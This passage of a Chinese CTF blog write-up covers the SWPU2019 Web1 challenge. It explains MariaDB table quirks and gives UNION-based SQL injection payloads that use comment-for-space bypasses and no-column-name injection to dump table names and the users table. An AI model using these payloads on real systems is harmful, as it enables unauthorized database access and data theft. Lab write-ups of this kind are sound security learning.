<li><p>使用 innodb 存储引擎<br>在<code>Mysql&gt;5.6</code>版本中，<code>innodb</code>增添了两个新表：<code>innodb_index_stats</code>、<code>innodb_table_stats</code>。<br>两个表都会存储数据库和对应的数据表，唯一与<code>information_schema</code>不同的是它没有列名。</p>
</li>
<li><p>sys 数据库<br><code>Mysql&gt;5.7</code>时，新增了<code>sys数据库</code>，基础数据来自于<code>performance_chema</code>和<code>information_schema</code>两个库，但是本身数据库不存储数据。<br>而且值得一提的是 MySQL 好像是默认关闭 innodb 数据库的，所以这也是一种新思路。<br>sys 有一些有用的表：</p>
<table>
<thead>
<tr>
<th>表名</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>schema_auto_increment_columns</td>
<td>只会显示有自增的表</td>
</tr>
<tr>
<td>schema_table_statistics_with_buffer</td>
<td>全部显示</td>
</tr>
<tr>
<td>x$schema_table_statistics_with_buffer</td>
<td>全部显示</td>
</tr>
</tbody></table>
<p>但是需要用户是 root 权限才能查看 sys 数据库，所以要先看一下 user()是不是 root。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">大概意思就是：</span><br><span class="line">sys 数据库必须root才能用！</span><br><span class="line">但是&#96;mariaDB&#96;里有没有sys数据库！</span><br></pre></td></tr></table></figure>



<p>因为用户权限是<code>root</code>，所以可以使用<code>sys</code>数据库。但是<code>mariaDB</code>数据库中没有<code>sys</code>数据库。</p>
<p>所以使用<code>mysql</code>数据库中的<code>innodb_table_stats</code>表。</p>
<h3 id="构造-payload2："><a href="#构造-payload2：" class="headerlink" title="构造 payload2："></a>构造 payload2：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>

<p>看了上面的payload：</p>
<p>发现之前理解有点问题！</p>
<p>mysql语句和<code>mariaDB</code>在某些地方还是有差异的！database_name    table_schema</p>
<h3 id="构造-payload3："><a href="#构造-payload3：" class="headerlink" title="构造 payload3："></a>构造 payload3：</h3><p>再利用无字段注入！</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210112124719.png" alt="image-20210105215732193"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">有没有as都可以！</span><br><span class="line">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;as&#x2F;**&#x2F;a,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>



<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210112124720.png" alt="image-20210105215903459"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a,b,c)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1&#x2F;**&#x2F;c,2&#x2F;**&#x2F;as&#x2F;**&#x2F;a,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(&quot;1&quot;,c,&quot;1&quot;,a,&quot;1&quot;,b)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1&#x2F;**&#x2F;c,2&#x2F;**&#x2F;as&#x2F;**&#x2F;a,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>



<h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">什么是OSINT？</span><br><span class="line">开源智能（OSINT）是指来自公共来源的数据集合，用于情报环境，这类信息往往被链接爬行搜索引擎（如谷歌）所忽略。此外，按照国防部的规定，OSINT是“从公开获得的信息中产生的，并且可以及时收集，利用和传播给适当的受众，以满足特定的情报需求。”</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/34235031">五大开源OSINT工具介绍</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">upload</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://upload.love/2021/01/04/BUUCTF-4/">http://upload.love/2021/01/04/BUUCTF-4/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://upload.love" target="_blank">upload</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">代码执行</a><a class="post-meta__tags" href="/tags/%E5%AF%92%E5%81%87CTF-DAY-03/">寒假CTF DAY 03</a><a class="post-meta__tags" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cbypass/">命令执行bypass</a><a class="post-meta__tags" href="/tags/shell%E7%90%86%E8%A7%A3/">shell理解</a><a class="post-meta__tags" href="/tags/ssti/">ssti</a><a class="post-meta__tags" href="/tags/%E5%9F%BA%E4%BA%8EMariaDB%E7%9A%84SQL%E6%B3%A8%E5%85%A5/">基于MariaDB的SQL注入</a><a class="post-meta__tags" href="/tags/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/">无列名注入</a><a class="post-meta__tags" href="/tags/OSINT/">OSINT</a></div><div class="post_share"><div class="social-share" data-image="/image/ttt.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/01/05/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/"><img class="prev-cover" data-lazy-src="/image/1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">网络配置 | 渗透学习 DAY 01</div></div></a></div><div class="next-post pull-right"><a href="/2021/01/03/BUUCTF-3/"><img class="next-cover" data-lazy-src="/image/ttt.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUUCTF3</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/01/07/BUUCTF-6/" title="BUUCTF6"><img class="cover" data-lazy-src="/image/ttt.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-07</div><div class="title">BUUCTF6</div></div></a></div><div><a href="/2021/01/13/命令执行-代码执行学习/" title="命令执行|代码执行学习"><img class="cover" data-lazy-src="/image/11111.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-13</div><div class="title">命令执行|代码执行学习</div></div></a></div><div><a href="/2021/03/31/ssti/" title="ssti"><img class="cover" data-lazy-src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive//Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/3.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-31</div><div class="title">ssti</div></div></a></div><div><a href="/2021/01/20/BUUCTF-13/" title="BUUCTF13"><img class="cover" data-lazy-src="/image/ttt.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-20</div><div class="title">BUUCTF13</div></div></a></div><div><a href="/2021/01/03/BUUCTF-3/" title="BUUCTF3"><img class="cover" data-lazy-src="/image/ttt.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-03</div><div class="title">BUUCTF3</div></div></a></div><div><a href="/2021/02/02/BUUCTF-22/" title="BUUCTF22"><img class="cover" data-lazy-src="/image/ttt.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-02</div><div class="title">BUUCTF22</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">upload</div><div class="author-info__description">每天都要开心</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">139</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">132</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://tcyba.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tcyba" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2384372932@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">我希望我以后每天都能开开心心！</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8A%E5%A4%A9%E6%97%A9%E4%B8%8A%E8%B5%B7%E6%9D%A5%E7%9C%8B%E5%88%B0%E4%B8%80%E4%BD%8D%E5%B8%88%E5%82%85%E5%8F%91%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98%EF%BC%81%E6%9C%89%E5%85%B3-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%81"><span class="toc-number">1.</span> <span class="toc-text">今天早上起来看到一位师傅发的一道题！有关 命令|代码执行！</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#shell%E9%87%8C%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">shell里的正则表达式</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WesternCTF2018-shrine"><span class="toc-number">2.</span> <span class="toc-text">[WesternCTF2018]shrine</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload1"><span class="toc-number">2.0.1.</span> <span class="toc-text">payload1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload2"><span class="toc-number">2.0.2.</span> <span class="toc-text">payload2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPU2019-Web1"><span class="toc-number">3.</span> <span class="toc-text">[SWPU2019]Web1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%8B%E9%A2%98%EF%BC%81"><span class="toc-number">3.0.1.</span> <span class="toc-text">看题！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-MariaDB%E7%89%B9%E6%80%A7"><span class="toc-number">3.0.2.</span> <span class="toc-text">0x01 MariaDB特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload1-1"><span class="toc-number">3.0.3.</span> <span class="toc-text">payload1:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-payload2%EF%BC%9A"><span class="toc-number">3.0.4.</span> <span class="toc-text">构造 payload2：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-payload3%EF%BC%9A"><span class="toc-number">3.0.5.</span> <span class="toc-text">构造 payload3：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OSINT"><span class="toc-number">4.</span> <span class="toc-text">OSINT</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/08/04/BUU-WEB-PWN/" title="BUU WEB PWN"><img data-lazy-src="/image/122.jfif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUU WEB PWN"/></a><div class="content"><a class="title" href="/2021/08/04/BUU-WEB-PWN/" title="BUU WEB PWN">BUU WEB PWN</a><time datetime="2021-08-04T03:43:03.000Z" title="发表于 2021-08-04 11:43:03">2021-08-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/03/BUUWEB-PWN/" title="BUUWEB PWN"><img data-lazy-src="/image/O1CN01F47VwI1CKtclK8YP3_!!63-0-lubanu.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUWEB PWN"/></a><div class="content"><a class="title" href="/2021/08/03/BUUWEB-PWN/" title="BUUWEB PWN">BUUWEB PWN</a><time datetime="2021-08-03T01:15:36.000Z" title="发表于 2021-08-03 09:15:36">2021-08-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/02/BUUWEBPWN/" title="BUUWEBPWN"><img data-lazy-src="/image/O1CN01tnC3zS2E44SvBVaSc_!!1660208690.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUWEBPWN"/></a><div class="content"><a class="title" href="/2021/08/02/BUUWEBPWN/" title="BUUWEBPWN">BUUWEBPWN</a><time datetime="2021-08-02T03:14:38.000Z" title="发表于 2021-08-02 11:14:38">2021-08-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/01/WEBPWN-1/" title="WEBPWN"><img data-lazy-src="/image/996.jfif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WEBPWN"/></a><div class="content"><a class="title" href="/2021/08/01/WEBPWN-1/" title="WEBPWN">WEBPWN</a><time datetime="2021-08-01T01:57:51.000Z" title="发表于 2021-08-01 09:57:51">2021-08-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/30/WEBPWN/" title="WEBPWN"><img data-lazy-src="/image/2239.jfif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WEBPWN"/></a><div class="content"><a class="title" href="/2021/07/30/WEBPWN/" title="WEBPWN">WEBPWN</a><time datetime="2021-07-30T04:25:09.000Z" title="发表于 2021-07-30 12:25:09">2021-07-30</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/2.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By upload</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.spacingElementById('content-inner')
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.spacingElementById('content-inner')
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    loader: {
      source: {
        '[tex]/amsCd': '[tex]/amscd'
      }
    },
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        addClass: [200,() => {
          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
            const target = node.parentNode
            if (!target.classList.contains('has-jax')) {
              target.classList.add('mathjax-overflow')
            }
          })
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script>(() => {
  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
    btf.wrap(item, 'div', '', 'katex-wrap')
  })
})()</script><script>if (document.getElementsByClassName('mermaid').length) {
  if (window.mermaidJsLoad) mermaid.init()
  else {
    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
      window.mermaidJsLoad = true
      mermaid.initialize({
        theme: 'neutral',
      })
      false && mermaid.init()
    })
  }
}</script><script>function loadValine () {
  function initValine () {
    let initData = {
      el: '#vcomment',
      appId: '',
      appKey: '',
      placeholder: 'Please leave your footprints',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'en',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: false,
      path: window.location.pathname,
    }

    if (true) { 
      initData.requiredFields= ('nick,mail'.split(','))
    }
    
    if (false) {
      const otherData = false
      initData = Object.assign({}, initData, otherData)
    }
    
    const valine = new Valine(initData)
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
  else setTimeout(() => loadValine(), 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'http://upload.love/2021/01/04/BUUCTF-4/'
    this.page.identifier = '2021/01/04/BUUCTF-4/'
    this.page.title = 'BUUCTF4'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://你的disqus的 short-name.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script>(function(d, w, c) {
    w.ChatraID = '';
    var s = d.createElement('script');
    w[c] = w[c] || function() {
        (w[c].q = w[c].q || []).push(arguments);
    };
    s.async = true;
    s.src = 'https://call.chatra.io/chatra.js';
    if (d.head) d.head.appendChild(s);
})(document, window, 'Chatra');

if (true) {
  var chatBtnFn = () => {
    var chatBtn = document.getElementById("chat_btn")
    chatBtn.addEventListener("click", function(){
      Chatra('openChat')
    });
  }
  chatBtnFn()
} else {
  if (true) {
    function chatBtnHide () {
      Chatra('hide')
    }
    function chatBtnShow () {
      Chatra('show')
    }
  }
}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>